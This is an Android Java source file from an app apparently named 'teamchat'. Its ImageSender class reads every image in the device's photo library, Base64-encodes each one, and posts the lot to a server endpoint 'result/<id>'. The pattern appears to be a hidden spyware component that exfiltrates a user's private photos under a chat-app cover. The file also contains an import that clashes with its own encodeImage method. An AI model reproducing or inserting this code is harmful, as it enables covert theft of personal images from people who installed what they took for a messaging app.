package com.example.teamchat;


import static android.opengl.ETC1.encodeImage;

import static com.example.teamchat.Constants.SERVER;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.opengl.ETC1;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.TimeZone;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class ImageSender {

    private final static String TAG = ChatService.class.getSimpleName();

    public static void readImages(Context context, String id) throws JSONException {
        Log.d("", "reading Images");
        ContentResolver contentResolver = context.getContentResolver();
        String[] projection = new String[] { MediaStore.Images.Media.DATA,
                MediaStore.Images.Media._ID};
        Uri images = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        Cursor cursor = contentResolver.query(images, projection,
                null,
                null,
                null
        );

        JSONArray imagesArray = new JSONArray();

        if (cursor.moveToFirst()) {
            do {
                int image_id = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media._ID));
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                Log.d("","image id: "+image_id +" path: "+ path);
                try {
                    Bitmap bitmap = MediaStore.Images.Media.getBitmap(contentResolver, Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(image_id)));
                    String encodedImage = encodeImage(bitmap);
                    String imageName = path.substring(path.lastIndexOf("/") + 1).trim();

                    JSONObject json = new JSONObject();
                    json.put("image_name", imageName);
                    json.put("bytes", encodedImage);
                    imagesArray.put(json);
                } catch (FileNotFoundException e) {
                    Log.e("","FileNotFoundException: "+e.getMessage());
                } catch (IOException e) {
                    Log.e("","IOException: "+e.getMessage());
                }
            } while (cursor.moveToNext());

        }

        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "images");
        parentObject.put("data", imagesArray);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error sending request: " + e.getMessage());
        }



    }

    private static String encodeImage(Bitmap image) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        image.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream);
        byte[] imageBytes = byteArrayOutputStream.toByteArray();
        return Base64.encodeToString(imageBytes, Base64.DEFAULT);
    }



}